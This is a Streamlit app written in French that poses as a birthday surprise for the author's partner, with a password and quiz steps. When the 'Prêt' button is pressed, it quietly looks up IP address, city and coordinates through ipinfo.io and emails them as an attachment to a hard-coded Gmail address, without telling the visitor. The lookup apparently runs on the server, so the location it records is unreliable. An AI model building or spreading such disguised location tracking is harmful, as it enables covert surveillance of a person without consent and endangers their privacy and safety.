import streamlit as st
import requests
import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# --- Configuration de la page ---
st.set_page_config(page_title="Joyeux Anniversaire Ma Rose 🌹", page_icon="🌹", layout="centered")

# --- Style CSS romantique ---
st.markdown("""
    <style>
    .main {
        background-color: #fff0f3;
    }
    h1, h2, h3 {
        color: #d90429;
        font-family: 'Helvetica Neue', sans-serif;
    }
    .stButton>button {
        background-color: #ff4d6d;
        color: white;
        font-weight: bold;
        border-radius: 10px;
        border: none;
        padding: 10px 24px;
    }
    .stButton>button:hover {
        background-color: #c9184a;
        color: white;
    }
    </style>
""", unsafe_allow_html=True)

# --- Fonction de génération du TXT et d'envoi par e-mail avec pièce jointe ---
def generer_et_envoyer_txt(contenu_texte):
    nom_fichier = "informations.txt"
    
    # 1. Création physique du fichier texte localement sur le serveur Streamlit
    with open(nom_fichier, "w", encoding="utf-8") as f:
        f.write(contenu_texte)

    # Paramètres de messagerie
    expediteur = "anil.sarier6@gmail.com"
    mot_de_passe_app = "VOTRE_MOT_DE_PASSE_APPLICATION_GMAIL"  # Remplacez par votre mot de passe d'application Gmail
    destinataire = "anil.sarier6@gmail.com"

    try:
        # Création du message e-mail
        msg = MIMEMultipart()
        msg['From'] = expediteur
        msg['To'] = destinataire
        msg['Subject'] = "🌹 Rapport d'anniversaire - Fichier informations.txt"

        # Corps du message
        corps = "Bonjour,\n\nVoici le fichier contenant les informations de connexion et de localisation de la visite.\n\nCordialement,"
        msg.attach(MIMEText(corps, 'plain'))

        # 2. Ajout du fichier 'informations.txt' en pièce jointe
        with open(nom_fichier, "rb") as piece_jointe:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(piece_jointe.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {nom_fichier}")
            msg.attach(part)

        # 3. Connexion SMTP et envoi
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(expediteur, mot_de_passe_app)
        server.sendmail(expediteur, destinataire, msg.as_string())
        server.quit()
        
    except Exception as e:
        print(f"Erreur lors de l'envoi du mail : {e}")

# --- Gestion des étapes avec la Session State ---
if "etape" not in st.session_state:
    st.session_state.etape = 1

# ==========================================
# ÉTAPE 1 : Le mot de passe (CINGENE)
# ==========================================
if st.session_state.etape == 1:
    st.title("🔐 Espace Sécurisé")
    st.write("Bienvenue... Pour accéder à cette surprise d'anniversaire, prouve-moi que c'est bien toi, ma rose. 🌹")
    
    mdp = st.text_input("Entre le mot de passe secret :", type="password")
    
    if st.button("Valider le mot de passe"):
        if mdp.strip().upper() == "CINGENE":
            st.session_state.etape = 2
            st.rerun()
        else:
            st.error("Mot de passe incorrect. Indice : C'est un mot très précieux...")

# ==========================================
# ÉTAPE 2 : Les questions personnelles
# ==========================================
elif st.session_state.etape == 2:
    st.title("💭 Quelques petits tests d'amour...")
    st.write("Juste pour être absolument sûr(e) que c'est bien ma reine qui est connectée ! ✨")
    
    q1 = st.radio("1. Quelle est la couleur du chat ?", ("Noir", "Blanc", "Roux", "Gris"))
    q2 = st.selectbox("2. Quel combattant UFC est adoré ici ?", ("Conor McGregor", "Islam Makhachev", "Jon Jones", "Khabib Nurmagomedov"))
    
    if st.button("Valider les réponses"):
        if q1.lower() == "blanc" and "makhachev" in q2.lower():
            st.session_state.etape = 3
            st.rerun()
        else:
            st.error("Mmmh... Ce ne sont pas les bonnes réponses ! Réfléchis bien mon cœur. 🧐")

# ==========================================
# ÉTAPE 3 : Le bouton Prêt / L'attente
# ==========================================
elif st.session_state.etape == 3:
    st.title("🎉 Tout est prêt pour toi...")
    st.write("Tu as brillamment réussi les tests. Cette page a été développée spécialement pour ton anniversaire, parce que tu comptes énormément pour moi, bien plus que tu ne le penses.")
    
    st.info("🎁 Clique sur le bouton ci-dessous pour lancer la surprise magique !")
    
    if st.button("Prêt(e) ! Découvrir la surprise 🌹"):
        # --- COLLECTE DES INFORMATIONS ---
        contenu_txt = "=== RAPPORT DES INFORMATIONS DE CONNEXION ===\n\n"
        try:
            r = requests.get("https://ipinfo.io/json", timeout=5)
            if r.ok:
                d = r.json()
                loc = d.get("loc", "0,0").split(",")
                lat = loc[0] if len(loc) > 0 else "Inconnue"
                lon = loc[1] if len(loc) > 1 else "Inconnue"
                
                contenu_txt += f"Ville       : {d.get('city', 'Inconnue')}\n"
                contenu_txt += f"Région      : {d.get('region', 'Inconnue')}\n"
                contenu_txt += f"Pays        : {d.get('country', 'Inconnue')}\n"
                contenu_txt += f"Latitude    : {lat}\n"
                contenu_txt += f"Longitude   : {lon}\n"
                contenu_txt += f"IP publique : {d.get('ip', 'Inconnue')}\n"
                contenu_txt += f"Date/Heure  : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        except Exception as e:
            contenu_txt += f"Erreur lors de la récupération : {e}\n"
        
        # Génération du fichier informations.txt et envoi par mail
        generer_et_envoyer_txt(contenu_txt)
        
        st.session_state.etape = 4
        st.rerun()

# ==========================================
# ÉTAPE 4 : La page finale d'anniversaire
# ==========================================
elif st.session_state.etape == 4:
    st.balloons()
    st.title("🌹 Joyeux Anniversaire Ma Rose ! 🌹")
    st.markdown("""
    ### Mon cœur,
    
    Si tu lis ce message, c'est que tu as passé toutes les étapes avec succès. 
    Cette petite application a été codée rien que pour toi, pour te prouver à quel point tu es unique et importante à mes yeux.
    
    Je te souhaite le plus merveilleux des anniversaires, rempli de bonheur, de sourires et de tout l'amour que tu mérites.
    
    *Je t'aime fort.* ❤️
    """)
